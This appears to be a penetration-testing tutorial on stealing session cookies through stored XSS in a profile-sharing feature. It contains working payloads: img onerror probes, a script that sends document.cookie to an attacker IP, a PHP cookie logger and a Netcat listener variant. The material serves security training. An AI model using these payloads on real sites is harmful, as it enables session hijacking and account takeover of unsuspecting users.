# Cross-Site Scripting (XSS)
We will focus on exploiting Cross-Site Scripting (XSS) vulnerabilities to obtain valid session identifiers (such as session cookies).

> Check out XSS Section for more in-depth attacks

For a Cross-Site Scripting (XSS) attack to result in session cookie leakage, the following requirements must be fulfilled:
- Session cookies should be carried in all HTTP requests
- Session cookies should be accessible by JavaScript code (the HTTPOnly attribute should be missing)

> **Note**: If you're doing testing in the real world, try using something like [XSSHunter](https://xsshunter.com), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com). A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.
## Example Scenario
It looks like we can edit the input fields to update our email, phone number, and country.

In such cases, it is best to use payloads with event handlers like `onload` or `onerror` since they fire up automatically and also prove the highest impact on stored XSS cases. Of course, if they're blocked, you'll have to use something else like `onmouseover`.

In one field, let us specify the following payload:
```javascript
"><img src=x onerror=prompt(document.domain)>
```

In the remaining two fields, let us specify the following two payloads.
```javascript
"><img src=x onerror=confirm(1)>
```
```javascript
"><img src=x onerror=alert(1)>
```

The profile was updated successfully. We notice no payload being triggered, though! Often, the payload code is not going to be called/executed until another application functionality triggers it.

Let us go to "Share," as it is the only other functionality we have, to see if any of the submitted payloads are retrieved in there.

If it works, let us now check if _HTTPOnly_ is "off" using Web Developer Tools.

- If it is off, we can continue
### Obtaining session cookies through XSS
Let us create a cookie-logging script (save it as `script.js`) to practice obtaining a victim's session cookie through sharing a vulnerable to stored XSS public profile. 

The below .js script can be hosted on your attacking machine:
```js
new Image().src='http://10.10.15.243:9001/index.php?c=' + document.cookie;
```

We can create this by starting:
```shell
cat << 'EOF' > script.js
```

Then paste the .js code, then type `EOF` to exit.

Now we need to write a PHP script (name it `index.php`) that will split cookies in case many were received, and write them to a file:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Then, we need to start an HTTP server with PHP in the same directory where `script.js` and `index.php` are:
```shell
php -S 0.0.0.0:9001
```

Now we enter the following payload into the vulnerable field:
```javascript
<script src=http://10.10.15.243:9001/script.js></script>
```

Now when the victim goes to the page, as long as your PHP server is running, the cookie will be captured and displayed in our listener
### Obtaining session cookies via XSS (Netcat edition)
Instead of a cookie-logging script, we could have also used the venerable Netcat tool.

First, we place the below payload in the vulnerable field:
```javascript
<h1 onmouseover='document.write(`<img src="http://10.10.15.243:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

Instruct Netcat to listen on port 8000 as follows:
```bash
nc -nlvp 8000
```

Now when the victim opens the page, we get their cookie sent to us in base64 from our listener.

> Note that the cookie is a Base64 value because we used the `btoa()` function, which will base64 encode the cookie's value. We can decode it using `atob("b64_string")` in the Dev Console of Web Developer Tools

# NOTES!
If the web application was utilizing SSL encryption, an attacker could still capture cookies through XSS.
